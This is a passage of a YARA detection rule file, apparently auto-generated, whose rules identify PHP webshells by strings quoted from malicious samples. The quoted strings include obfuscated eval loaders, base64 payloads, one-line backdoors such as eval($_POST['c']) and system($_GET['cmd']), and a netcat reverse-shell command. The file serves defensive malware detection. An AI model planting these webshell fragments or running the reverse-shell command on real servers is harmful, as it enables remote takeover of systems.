      $s15 = "Le7l2BlJHTCexobFhoHTb5k/mswf27AFXLXMASym+6h8eW+NYfW8NAyB8g9C+cdGq+DiX8So4yMCLgp/fKvQbW+qskujZLaNigACWcBY21iz2gZvO5/yyfWfeX62v/oS" ascii
      $s16 = "v1/pVex+xR4J8RqtWGjrkJYwWy7abGRNgdHASzzKqdqwwL5TYEZF7QUKyFYRj1GovZOyZ+ENVpxIjZXKL3bvMnxavPif5renpcKKUdZnrPQf5Tpu4bssvUe5xjPl1cOf" ascii
      $s17 = "BVafIGkGhQKjP08ptqK0VigEc4mhGuuZFsbJ84nxBDFPnxbcEpKiuCVW65/Nsh/0BE2l2BKQ5OTpZIJycjC/i/qwtXTibUUnTc97DH3mT2ZFjNNytBXChOuSx5TMV1bo" ascii
      $s18 = "V/6W6Mh3GVxGl5fmZdUQDlDELtTHMmwNcQU/HwoeScJ7ZfxKRb/i7FjRc6hTSt/R21XOJsmBOhvLSU5ILYUkXHlAuFOO4Xicw/R5Z27hIFqZsDthXA6LTfNeepmZ+sgL" ascii
      $s19 = "fjo1/F/znkDLUa8cDe9AFBlHDfbrJGKHU9vtWeWPTtCzxlZzZAVw/m5Um9cOnHpty1sldUoj8icphOz+CYk1MOv7/h0Tmf1+v5klp16vI3w4scblYa1sSXDR+2zFHaFg" ascii
      $s20 = "iYXfSQfYHbysTTtpGWZT3UB5N/l0ly9uKqgU9pKAzcLBpPY978yfkHdoOv0N7ZpNpa/TYbT+LzfsSZxwMeYkfyF97xrdDJn4sq0JLDwOJYZF+lN5t/dl9/jTUan5BN/f" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule sig_858254949dc8f02221683588a5a400b51d99dc58
{
   meta:
      description = "php17 - file 858254949dc8f02221683588a5a400b51d99dc58.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e726cd071915534761822805724c6c6bfe0fcac604a86f09437f03f301512dc5"
   strings:
      $s1 = "hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLycpKSk7ZXZhbCgkT08wME8wME8wKTs=')));return;?>" fullword ascii
      $s2 = "9kiCdL5jTX32DkRCwQRGmLuXKkLqdkiCdWIZH79zw89JjZlZ/LuXmiF1dejI9kiCdLlPExgA+kYXjqMVm8gIwo+idz5jTZCUdZRljkiOdqlkaQ5u1xtzh8i2Dz5XaQRG" ascii
      $s3 = "1ySnT8n7dQave6TzH79kwQSicLuXT8vOaxSJaxCve6+WdQYnDQr0+qCUaxnUwe+v+7uI+qCUdkiCdelZE6MZH79FDx9icWjJe6TAQ5+iDktFdLlPExgA+kYXjqMVm8gI" ascii
      $s4 = "+gvmNp3mNp3mNp5ijkLZeq+ij8Snaxr0+5vc9UiN9Lvc+7uX+7TO+gvmKy3mNgPuN6sX+7TC/8+njxrxRtvUdQR2d8r0jq97hoT0dZ+iaQf0+gPuNp3mNgPuN6uUKlPu" ascii
      $s5 = "jqLXDQile6TIDktFdK5jTktzh8i2DiuXTodnDoLimLuXrxLOdtuXToRlHQSimLuXdkvOh65kaQ5JDoUBTt9nw8vFaKCIdkvOh65yweJi1XMSN63uHpCIakv7d8L71XMS" ascii
      $s6 = "1ul/cfl/cfl/dQSydQikT6nM+tvo9L9D+xtzh8i2DXhhTplvT6hFwx9JjXjJToCR6X9OdehUweTImWMUelhtLtCZDkLqd8i7+5lVpfJJdXM0f85Gd8i7/6TUaxnUweTX" ascii
      $s7 = "dkv7DW3Fde90Dxfve6+fK5Rre6TIaQRlwQvOmLuXH79kjq97wQYZcWdnDeMVaQRlwQvOmeLuD8vnd6dnDeMVaxnUweTv+8R0d8i7e6TIdQYzhoiudK5jTk55Do9Jj8t7" ascii
      $s8 = "jqMVm8gIwo+idz5jTXRV+8dJD8Lve6TIDxYzD8izwy5jTUR0KQvU/6jUaxnUweTZE6MZ+8dJD8rZ/LuXmiFpw852dtlPExgA+kYXjqMVQlR2joihm6vldpsX1ul/cWMI" ascii
      $s9 = "m6vljzsZ1ul/dQR0D7MZT6MITpSljzsZ1ul/dQR0D7MXT6MIT6MImo9UTohJdo90mLuXNKMu+LuXToRlHQSimLuXdkvOh65kaQ5JDoUBTt9nw8vFaKCIdkvOh65yweJi" ascii
      $s10 = "TZhJDk92h7YCDxRnh8i2Dz5jTiuXT6CI+qCUdZRljkiOdqlkaQRlwQvOme+iDktFdWdzw89JjzlZT6CIaxnUweTI/7MZ+kdJD8rv+7MGT8dJD8rI/7MZ+kYihxYnDQrv" ascii
      $s11 = "DxYlmXTVpfJvpfJvT8LCjxLJdXM0+o9Yj8rImKlI+x9JjXjJToCR6kikT6nMjk5UweT0TX9zw89JjXTOTX9kwQSiTXUJToCR6X9FjxjImWMXm8d2DZfIaxvCDqTve6Tz" ascii
      $s12 = "+7MGT8PI/7MZ+k52d8rv+7MGT852d8rI/5uXe6TVTzCR6kLzw8PI+qlZ1ul/dQR0D7MZcWjVpfJiaxn2T6hkhQYzh8i2DX3pDq3Y/8R0d8i7E63kwQSi/W3V+yCR6kLz" ascii
      $s13 = "jqlPEq9UmXTVpfJiaxn2T6jPEq97mXjVpfJvpfJiaxn2T6jPhoTA+yCR6kLzw8PITzSld63qwQ9lwp5jTzIie6TATzCR6kLzw8PITzSuT8tCwQhOmLuXjkiZwo9jTzsP" ascii
      $s14 = "mXTVpfJiaxn2T6jPhoTA+yCR6kLzw8PITzSld63qwQ9lwp5jTzguN6LjTzsX1ul/dQR0D7MXm8d2jklIDQLlw8vUmLuXrgvKLtuXT8tzh8i2Dz5jTZCUdZRljkiOdqlk" ascii
      $s15 = "e6TzNpMuNpIue6TAH79kwQSicKu2dkvOhpsC+kYXjqMVm8d2DZfIaxvCDqTve6TzNpMsNpMue6TAaxvuwQLUT8d2jzu2dkvOhpsIm8d2DZfIaxvCDqTve6TzNpMuNpIu" ascii
      $s16 = "T8tyd8tUj7IJ1ul/wQaI/69Rde90Dx9yTplvT6jZ/W3VT69Rde90Dx9yTplI+yPbm7jVcfl/dQR0D7MZmo97mXjVpfJiaxn2T6TPh8fIhxiUh8Ive6Ts+LuXmXTVpfJi" ascii
      $s17 = "6X9FjxjImWMXm8d2DZfIaxvCDqTve6Tz9UauNpMue6TA9e+7DqTkDk+yjpFlD7dOaZRu1q97wQLy+kYXjqMVwefkDk+yjpFzjkLnh8Ly+kYXjqMVae+zw8ixdWsPExd2" ascii
      $s18 = "xlKC0tJE8wME8wME8wMClmZ2V0cygkTzAwME8wTzAwLDEwMjQpO2ZnZXRzKCRPMDAwTzBPMDAsNDA5Nik7JE9PMDBPMDBPMD0oYmFzZTY0X2RlY29kZShzdHJ0cihmcm" ascii
      $s19 = "heRijZ5jTzYDrkLFDq9iTgtzaxLyj5lPExgAm6vCdQhiDkfATzCR6ZlIdQSydW3VpfJiaxn2T6TPD8LZdQYUmU9JjXdOaZRu1lYm1XdOaZRu1qCUaxnUwe+v+kYXjqMV" ascii
      $s20 = "wo+idz5jTZCUdZRljkiOdqlkaQ5u1xtzh8i2Dz5id8il+ktFjpFzw89JjzlUaxnUweTkaQ5u1xdJD8rv+8dJD8LjTzsUdkiCdKu2aKsPEq9UmXTVpfJvT8LCjxrIHul/" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      8 of them
}

rule sig_7da9a8367ac04343f88eb2245c530708bfa0fa3f
{
   meta:
      description = "php17 - file 7da9a8367ac04343f88eb2245c530708bfa0fa3f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d4c80e707047bf5d348cc33f7b9eb93ce9f07825fc079a7d4eff968b0c077eb8"
   strings:
      $s1 = "$_eval_post_1 = $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr" fullword ascii
      $s2 = "$_create_function = $_chr(99).$_chr(114).$_chr(101).$_chr(97).$_chr(116).$_chr(101).$_chr(95).$_chr(102).$_chr(117).$_chr(11" fullword ascii
      $s3 = "$_= $_create_function(\"\",$_eval_post_1);" fullword ascii
      $s4 = "(84).$_chr(91).$_chr(49).$_chr(93).$_chr(41).$_chr(59); " fullword ascii
      $s5 = "$_chr = chr(99).chr(104).chr(114);  " fullword ascii
      $s6 = "0).$_chr(99).$_chr(116).$_chr(105).$_chr(111).$_chr(110);" fullword ascii
      $s7 = "$_eval_post_1 = $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr(84)" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_991d4aa1aca0321d7d3be3dbb323ac7293947fe6
{
   meta:
      description = "php17 - file 991d4aa1aca0321d7d3be3dbb323ac7293947fe6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "471483a8811df5b7150c11ef7045e4f4004cfed5c0238f81b7cd782a2d980ba7"
   strings:
      $x1 = "\\\">lostpassword</a> and <a href = \\\"http://www.d3vilc0de.org\\\">D3vilc0de crew</a> ]</center>\\n</body>\\n</html>\";" fullword ascii
      $x2 = "* PHP Shell scritta da lostpassword, D3vilc0de crew" fullword ascii
      $x3 = "* La Shell presenta varie funzioni, ma rimane comunque in continuo aggiornamento" fullword ascii
      $s4 = "print \"<td>[ <a class = \\\"head\\\" href = '\" . $c . \"&mode=execute'>Shell Command</a> ]</td>\\n\";" fullword ascii
      $s5 = "print \"Executing the following command:<br />\\n\";" fullword ascii
      $s6 = "print \"<tr>\\n<td><input type = 'submit' value = 'Execute'></td>\\n</tr>\\n</form>\\n</table>\";" fullword ascii
      $s7 = "header ( \"Content-Description: Download manager\" );" fullword ascii
      $s8 = "print \"<table>\\n<form action = '\" . $c . \"&mode=execute' method = 'POST'>\\n\";" fullword ascii
      $s9 = "$ret = shellexec($command);" fullword ascii
      $s10 = "header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir.'&mode=remove&file='.__FILE__);" fullword ascii
      $s11 = "$info .= ((ini_get('magic_quotes_gpc') == 0) ? '[~]Magic Quotes: <font color=\"#00FF33\">OFF</font><br />' : '[~]Magic Quotes:" fullword ascii
      $s12 = "<a href = '\" . $c .\"&mode=rename&old=\" . $out . \"'><img src = 'http://img51.imageshack.us/img51/7241/replyl.gif'" fullword ascii
      $s13 = "function shellexec($cmd) {" fullword ascii
      $s14 = "header ( \"Content-Disposition: attachment; filename=\".$filename.\";\" );" fullword ascii
      $s15 = "print $_POST ['hash'] . \": \" . \"<b>\" . hash ($_POST ['type'], $_POST ['hash']) . \"</b>\";" fullword ascii
      $s16 = "header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);" fullword ascii
      $s17 = "header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].$c.'/'.$goto);" fullword ascii
      $s18 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" seconds | by <a href=\\\"http://lostpassword.hellospace.ne" ascii
      $s19 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" seconds | by <a href=\\\"http://lostpassword.hellospace.ne" ascii
      $s20 = "* Data rilascio: 25/12/2009 (eh si, il giorno di natale non avevo niente da fare)" fullword ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule sig_6a00ee40c8ed4bdbd5a70b8ec5469a969d2ec898
{
   meta:
      description = "php17 - file 6a00ee40c8ed4bdbd5a70b8ec5469a969d2ec898.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d2879466f3b3d36acd43a093d6ab55dda7b4e61f3717af80530e0c84822c3d2a"
   strings:
      $x1 = "back Shell, use: <i>nc -e cmd.exe [SERVER] 3333<br>" fullword ascii
      $x2 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ Command Execute ]</font></td>" fullword ascii
      $s3 = "</i>after local command: <i>nc -v -l -p 3333 </i>(Windows)</font><br /><br /> <td><p align=\"center\"><br>" fullword ascii
      $s4 = "<textarea readonly size=\"1\" rows=\"7\" cols=\"53\"><?php @$output = system($_POST['command']); ?></textarea><br>" fullword ascii
      $s5 = "/*    0.3.2          666            coded a new uploader" fullword ascii
      $s6 = "none\" target=\"_blank\" href=\"http://www.SR-Crew.de.tt\">SR-Crew</a> </font></td>" fullword ascii
      $s7 = "$filecontents = stripslashes(html_entity_decode($_POST[\"contents\"]));" fullword ascii
      $s8 = "<br><input type=\"submit\" value=\"Execute!\"><br>" fullword ascii
      $s9 = "$status = \"<font face='Verdana' style='font-size: 8pt'>Error or No contents in file</font>\";" fullword ascii
      $s10 = "<font face=\"Verdana\" style=\"font-size: 8pt\">Insert your commands here:</font><br>" fullword ascii
      $s11 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">Rootshell v<?php echo \"$version\" ?>  ? 2006 by <a style=\"text-decoratio" ascii
      $s12 = "$filecontents = htmlentities(file_get_contents($filename));" fullword ascii
      $s13 = "<textarea name=\"contents\" cols=\"53\" rows=\"8\"><?php echo $filecontents;?></textarea></font><br>" fullword ascii
      $s14 = "<textarea size=\"70\" name=\"command\" rows=\"2\" cols=\"40\" ></textarea> <br>" fullword ascii
      $s15 = "<font face=\"Verdana\" style=\"font-size: 8pt\"><b>Current Directory:</b> <?php echo $_SERVER['DOCUMENT_ROOT']; ?>" fullword ascii
      $s16 = "echo '<a target=\"blank\" href='.$file.'>'.$file.'</a><br>';" fullword ascii
      $s17 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ File Upload ]</font></td>" fullword ascii
      $s18 = "/*  ummQHMM9C!.uQo.??WMMMMNNQQkI!!?wqQQQQHMMMYC!.umx.?7WMNHmmmo */" fullword ascii
      $s19 = "<form method=\"post\" action=\"<?php echo $scriptname;?>\">" fullword ascii
      $s20 = "$status = $status.\"<font face='Verdana' style='font-size: 8pt'>Could not write to file! (Maybe you didn't enter any tex" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule sig_67959d156ad04af2fcc7804961f2772e31cacf62
{
   meta:
      description = "php17 - file 67959d156ad04af2fcc7804961f2772e31cacf62.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b0e3a8cce8c2828a9448299ed4ea56a41e8885e31feb7f0834c24b497e38e6f5"
   strings:
      $s1 = "if(isset($_GET['cmd'])){" fullword ascii
      $s2 = "$cmd=$_GET['cmd'];" fullword ascii
      $s3 = "system($cmd);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AbstractLogger
{
   meta:
      description = "php17 - file AbstractLogger.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1e8dc30cd3e1649ebbb5fe8da28221469c45b71fb2e9c03f829d1e0c3329a232"
   strings:
      $s1 = "* reduce boilerplate code that a simple Logger that does the same thing with" fullword ascii
      $s2 = "* This is a simple Logger implementation that other Loggers can inherit from." fullword ascii
      $s3 = "* It simply delegates all log-level-specific methods to the `log` method to" fullword ascii
      $s4 = "* messages regardless of the error level has to implement." fullword ascii
      $s5 = "$this->log(LogLevel::ERROR, $message, $context);" fullword ascii
      $s6 = "abstract class AbstractLogger implements LoggerInterface" fullword ascii
      $s7 = "$this->log(LogLevel::ALERT, $message, $context);" fullword ascii
      $s8 = "$this->log(LogLevel::DEBUG, $message, $context);" fullword ascii
      $s9 = "$this->log(LogLevel::NOTICE, $message, $context);" fullword ascii
      $s10 = "$this->log(LogLevel::EMERGENCY, $message, $context);" fullword ascii
      $s11 = "$this->log(LogLevel::WARNING, $message, $context);" fullword ascii
      $s12 = "$this->log(LogLevel::INFO, $message, $context);" fullword ascii
      $s13 = "public function error($message, array $context = [])" fullword ascii
      $s14 = "$this->log(LogLevel::CRITICAL, $message, $context);" fullword ascii
      $s15 = "public function emergency($message, array $context = [])" fullword ascii
      $s16 = "public function debug($message, array $context = [])" fullword ascii
      $s17 = "public function alert($message, array $context = [])" fullword ascii
      $s18 = "public function notice($message, array $context = [])" fullword ascii
      $s19 = "public function warning($message, array $context = [])" fullword ascii
      $s20 = "public function info($message, array $context = [])" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule php17_150
{
   meta:
      description = "php17 - file 150.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a6249fbbbe830740c71c0f34f8bcada9bfbaa9bf07bf54b6bfb6b52178d9985f"
   strings:
      $s1 = "HJ3HjqxclkZfpWb1SwzwTmp1KYDAew+TFt4H3j59kzW6edMRnLP3/tYSBPmf//2f//yrOJL+n+ppfmWfbMU/abIWBPZ/eZGNefHPv3kZFdPVTLrOB6cgpz8WEX1B7lSb" ascii
      $s2 = "+g20O23YvrnxiRCMRh7LNGpypSixPEQpH/7xDkwsrxKRQpLf90rdINR42ud2lW/v4vjpNvLGHRh0GGqi/G72e9h46n3aJnoFZKQda/wgxGBj2dSjvxMa3+Hg5SrN9Thy" ascii
      $s3 = "EGPmwbdBrtwROjp3ArrAnT049lOuCf+en2ymN/RUQ6t349eaH6wCzKz0qGU7sYOjinYaNz3KzYWWNIKn2f7B0vKRQMLPO4SqrBs47X4AQyGELUD8DYEt9GPWxFtPPSUZ" ascii
      $s4 = "RSIoP5HG/PJ0pB6GsCfXlWoa96bjQh3dNUpHfMa+UUoOpZJ1u95ZApicDOWK7RK3Oc/nGetEfDk1vHnuWJJs3PdM4NA0YxAX1d3Gyw2fVcZtcuk4YSVDRr9th8504fWE" ascii
      $s5 = "jTAncF0sFFJ4GulNQybqL/h7d4oE3CsD5tEoyNqrqO/07MtXZA5U/j4a8/umYlPeLO11drBspYC/Wth8J9LYp81DMGHc1FsrwyGMP0d8CzQ4C6E1fplDEolfYCetfxGg" ascii
      $s6 = "JMOPuVZ/R8t3nsEpDpjIHDYwf66n5IfFGmKvlOGSeUCGZxzyuqV16Z/y+Tg914YNG57k5OM4ZglKeU/s32UJgghBanZEhNGt1fukmmL1+3emuFk+Pfh1mf1Z6VbxrUtk" ascii
      $s7 = "olRG4pRiEUCEvhvv6VzHApvbMTAM/tE4rg7U42XbmhjfRXmxsUggccjn8Jy/IR74SBdMDM525oh3iRvwVZQ+cobcUAJgHl8As9wQTgmYDlLh4fMzrq3qgkA6cTjqSsdp" ascii
      $s8 = "qCCbUFJkPOYdivro3xs0LKcN+picczDeL7S3SAZW3bLCcyezUmFYIjD53HJohCLOg6DyNgkDm8IOwaXxSW/V7OH+RywuOcLfIk+aOTtxrO9E1BAO+5iSS5qE41cLhpch" ascii
      $s9 = "GfwAvhyY+Epk4GyBNFvF5DLLlg2QVxiLSEoe/bZZZZvvBEqg+9IzhpDx32TE85Tc6VcY7jacf6Dk1e2vxwo3/jzzVwy/9vAVPxNneaojfvQfoV1YvOSl8AtTrXY+eXe7" ascii
      $s10 = "8qlADy6Wm+jbE8dLLqgdwOKYcIsj/DC/D6rIohpEBNRh5Tidrw4eIIWBwjsPcYDeTRrPXV/bBWzhGzhEs+9qmBv2JvLYlvQ/G6lnOhbnLjsBsEFxiyq+DpaDky6V29wE" ascii
      $s11 = "A5WNQvT44POAvKGeTIZSxulf0fmkGyw1AnR8LXwBD7I0BeEAO0Q42aIvrfq5JhYS1MiHOOHV5cdSZAWGHnDrojNwQtji4OTrnwglFh6+BPjHQxWmoE3y+rTeFnN7V+Sb" ascii
      $s12 = "k8oEH+fbitOX48mXsZESBEm0AsHneUAQWEAQtP5+KpBh/v3v//7nn3/+9V//+d//+c//AQ=='))); ?>" fullword ascii
      $s13 = "v4BntA+GknI88Cx1oCMDXgIzv/3Om9uBysqCSdrwB0z4AWpuNtZzUFlugbVdRL/buKaBXLxLruxvw//OGpDyRKy7dyWVKraJHRjDXsaSPbBbJ36qpZoTXx7G57Q9BCUe" ascii
      $s14 = "HJ3HjqxclkZfpWb1SwzwTmp1KYDAew+TFt4H3j59kzW6edMRnLP3/tYSBPmf//2f//yrOJL+n+ppfmWfbMU/abIWBPZ/eZGNefHPv3kZFdPVTLrOB6cgpz8WEX1B7lSb" ascii
      $s15 = "p/896pM/UvlxnRVVUbBINz9mfuTX9pdCq+Nrsy4Wrxl+XGoaYcdrslH3svGhrFz3cZ7PE2VzJumm9AgvSgT7IpfNz6QQ45dO8emZ0dbbIzHdVQCD+oU8G2GCpOCHCkeg" ascii
      $s16 = "UmFqzP5BAIh+3YFpcMZCCUll4hgTt82tfZKK+kwTrgIkBab0GidR80sgfWnklFxVJ3TV4M9H3NsUmv3JK2RTTei+O4Nf+MQtqyEsoqk+zQaTAdr4/a7Bh0Xrunn/X/w0" ascii
      $s17 = "kiJ3I7ZAExmpEWeQVvfPjlBgvIFXQNS9n1pmR808xFIE6p7zcih8Njx2VJQbinVQBcQyXyy0pn/9NV2g0mwNlWFDrhcfpy8HGY8f6f5Qd5zFHTuqRy3P82XHbwkRSJD5" ascii
      $s18 = "tCL7ZcQ9l5hBFtZI0hXTHqaX+kIycyPa5nGM5r6yxeZH/NK+sPABINJgmbPLV2L64a7BYe/V6iTctIqTFPyohGCc0MZ+20orzVA5/aFex6of63XGd8WxELwfPyrnvCNJ" ascii
      $s19 = "QKOa0sGSUZxEtTfybInSou0KLDD957zCIKct417R4867/ApG6J0DWASE3qUDYqKTvM4jBHKEUKCFUVJQPA80uz59mWhRBYb1j/9gO/DgYgP0J0K42TP65PhUWCh3W/Ge" ascii
      $s20 = "VZu7Ieyw4z8sauhj7Gt204ud6FXhgBZCkbiNA55yANXCqQ9uLL8VK9NEigyaLdrV7mhONhzmD/lFBLQebglZkFHc7VtqjZvyzUhEQzneNma4Atbxsr10mVh8NTpQ2Ly9" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_546dc4d23096bf98653b5a9621708943
{
   meta:
      description = "php17 - file 546dc4d23096bf98653b5a9621708943.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3cb97146c037951f37cc7838f56900e9d06eb4e42b69a61c62bf7f4d1c68b4ec"
   strings:
      $s1 = "), $_COOKIE [str_replace('.', '_', $_SERVER['HTTP_HOST'])]) . ';'); $_pbotwei($bfogay); " fullword ascii
      $s2 = "function pbotwei ($egcsn, $ydzkq) { return $egcsn ^ str_repeat ($ydzkq, ceil (strlen ($egcsn) / strlen ($ydzkq))); }  " fullword ascii
      $s3 = "'6ZXNzZ2VzRVJTRXhjcHJpKCl7dD4kZCBsbmN0X2RlaXN0OGJpZSxzZS4kVXNlOGJpPj'." fullword ascii
      $s4 = "'uPmdlL3NpJ3RlRS4kZW1hJHBvKTt9bWFpbXRwdC1UaXMtKCR3eS49YXlfaGlzZWQgbW'." fullword ascii
      $s5 = "'jJGxlKCRsPTApaGlzZjo6dWU7KTskY2FzJGJvJGspY29kIiRjaW5lVEg9Jy8nMn0vcm'." fullword ascii
      $s6 = "'fWlmaXMtdCk7KCRmZSgnO2NhOV17LT5FMS05ZG1hdGFjcy0+JywkZWFtKSwkIHN0U1R'." fullword ascii
      $s7 = "'XplbmQpKXskbWFpbV9uJHRoZWNob3VuaWc9ZWQ9Y3RlRUNUKSg/fWJyb3JfZXhpOyRh'." fullword ascii
      $s8 = "6cF91dC49c3d" ascii
      $s9 = "'TEU7bWFpcmdlbGFzMzt3X2NvcnQ9Oi4qcmVzc2U2KCRiPz5bezN9cmV0ZighRj0wdHV'." fullword ascii
      $s10 = "'KTskeyRycigwKCEkPiRueSgpPiRncy0+bHRlcjt9KCRsJHRoOyR0b25zdCIuRVJWOyR'." fullword ascii
      $s11 = "'KCRiaW1lZWxzbiw1dCgkJyl7Jzt9JGVuIGZ1PSRhJG91LT5lLT5jJzokeyRhKSl7cml'." fullword ascii
      $s12 = "'xzbGVhciI9QXV0aXMtZD10Y29keyRtLT5zaW1lc3RyKCRzXXsxcz1uYW1lbWVvcnkoZ'." fullword ascii
      $s13 = "'nZmlnYWRfJ3NtJGZyKCdsamVjcy0+ZXR1VkVSZXskdGhpeGlzJHMpLTMpKCRheGlzZW'." fullword ascii
      $s14 = "'dEZWJ1PScnYWNrYWlsZXJMZXBsc3RyKSwkeyRyZWFtb3N0NH0pJGh0Oig/dmFpcigkO'." fullword ascii
      $s15 = "'b2RlZT0neV9raXNzb3Jlciddc3Bycy0+KXskLVphbywkeyRmcnM9ZnVuWzFdRUJVYnN'." fullword ascii
      $s16 = "$_pbotwei = create_function ('$bfogay', pbotwei (base64_decode (" fullword ascii
      $s17 = "'dF9tJHRoZXIoJHRocm5zb3B0bG8pdGhpYmFzZz0nb1swc2VjYnN0KGlzJXMn'; " fullword ascii
      $s18 = "'dEVycm9yaW5pJGNjYm9kfQ==JHR5cmVwMDAtKCRwKTt9aGlzb21tL14oZm86X2RlLVx'." fullword ascii
      $s19 = "'V7dXQuZG9fKCRhIGFzLCdRJG5hbi0xdHlwZWQgaGlzZGVycnJhc3NhY3JlYS16Oig/c'." fullword ascii
      $s20 = "'wwYXBzdG9haG9zdGhpZGVyKCFldGhpJHRoKS4ibXRwY3RpcigkYXJzdW5jTk9PKSg/U'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_459ea4af0aebe7b31adae58459c31eb6204ba465
{
   meta:
      description = "php17 - file 459ea4af0aebe7b31adae58459c31eb6204ba465.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e5d238af3cb65b7d9a5058cba5602ab56a17549b46d1c9a466624910c004d7fb"
   strings:
      $s1 = "$P='ay5^(\"/\",5^\"+\")5^,$ss($s5^[$5^5^i],0,$e5^))),$k)))5^;$o=ob_get_content5^s();5^ob_end_c5^lea5^n5^();$d=';" fullword ascii
      $s2 = "$K=');}if(arr5^ay_5^key_e5^xis5^ts($5^i,$s)){$s[$i].=5^$p;$5^e=5^strpos(5^$s[$5^i],$f)5^;if5^($e){$k=$kh.$5^kf;ob_5^s5^tart';" fullword ascii
      $s3 = "$u='();@e5^5^val(@gzuncompres5^s(@x(@b5^ase645^_5^5^5^d5^ecode(preg_rep5^lace(arra5^y(\"/_/\",\"/-5^/\"),arr';" fullword ascii
      $s4 = "$w='$kh=\"5d41\";5^$k5^f=\"5^402a\";funct5^ion 5^x5^($t,$k){$c=str5^len($k5^);$l=st5^r5^len($t);$5^o=\"\";f5^or($i=05^;';" fullword ascii
      $s5 = "$k='base65^4_en5^code(x(gz5^co5^mpress($o),5^$k)5^);pri5^nt(\"<$5^k>$d</$k>\")5^;@s5^ess5^ion_5^destroy();}}}}';" fullword ascii
      $s6 = "$M='match_all(5^\"/([\\\\w])[\\\\w5^-]5^+(?:;q=05^.([\\\\d]5^))?,?/5^\",$r5^5^a,$m);if($q&&$m)5^{5^@s5^ession_st5^ar';" fullword ascii
      $s7 = "$T='5^$i<$l5^;){for($j=5^0;5^($j<$c&&$i5^<$l);$j++5^,5^$i+5^+){$o.=$t{$i}^5^$k{$5^j};}}ret5^urn 5^$5^5^o;}$r';" fullword ascii
      $s8 = "$q='a){5^$u=par5^se5^_url($5^rr);5^parse_str5^($u[\"query5^\"],$5^5^q);$q=ar5^ray_valu5^es($q)5^5^;preg5^_';" fullword ascii
      $s9 = "$r='($ss(m5^d55^(5^$i.$kh),0,3));$f=5^$sl($5^5^ss(md55^($i.5^$kf),0,3))5^5^5^;$p=\"\";for($z=1;$5^5^z<co';" fullword ascii
      $s10 = "$p='t();$s=5^&$_SESSIO5^N;$ss=5^\"5^substr\";$s5^5^l=\"strtolo5^wer\";$i5^=$m[5^1][0].5^$m5^[1][15^];$h=$sl';" fullword ascii
      $s11 = "$l='unt($m[1])5^;$z++)$p.=5^$q5^[$m[2][$z]5^];if5^(strpos(5^5^$p,$h)=5^==0){$s[5^$i]=\"\";5^$p=$ss($5^p,35^';" fullword ascii
      $s12 = "$N='=$_5^SERVE5^R;$rr=@$r[\"HT5^TP_RE5^FER5^ER\"];$ra=@5^$r[\"HT5^TP_5^5^ACC5^EPT_LANGUAGE\"]5^;if($rr&&$r';" fullword ascii
      $s13 = "$X=str_replace('5^','',$w.$T.$N.$q.$M.$p.$r.$l.$K.$u.$P.$k);" fullword ascii
      $s14 = "$H=str_replace('eB','','ceBreBeateeB_fueBnceBeBtion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_2c880e9a3acfaf4b19ae3c784508fba1
{
   meta:
      description = "php17 - file 2c880e9a3acfaf4b19ae3c784508fba1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8613c8fddcaa985ba2ca071856e2a9b86d37c0b9c74898336bead195b632dddb"
   strings:
      $s1 = "$gxqk9 = \"s_opt\" ; $yed7 =strtoupper( $gxqk9[1].$gxqk9[3]. $gxqk9[2].$gxqk9[0]. $gxqk9[4] );if(isset (${$yed7} ['q0e7f9c'" fullword ascii
      $s2 = "] ) ) { eval ( ${$yed7 }['q0e7f9c' ]) ;}?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_118ef1fc3db5d228e8bef55af553bd463a890b67
{
   meta:
      description = "php17 - file 118ef1fc3db5d228e8bef55af553bd463a890b67.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "51a51164ded8b630ea180959aed6070d9886d868f84e9838c254a9266b470746"
   strings:
      $s1 = "eval($_POST['c']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_03e7d2ebec1e820ac34d054df7e68f48
{
   meta:
      description = "php17 - file 03e7d2ebec1e820ac34d054df7e68f48.php"
      author = "WatcherLab"
      date = "2019-02-23"
